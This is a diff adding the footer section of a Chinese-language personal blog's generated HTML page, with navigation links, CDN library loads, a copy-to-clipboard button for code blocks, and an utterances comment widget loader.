+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Leon
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/sites/">站点</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'leonooo13/Talk';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+
+<!-- FancyBox -->
+
+</body>
+</html>
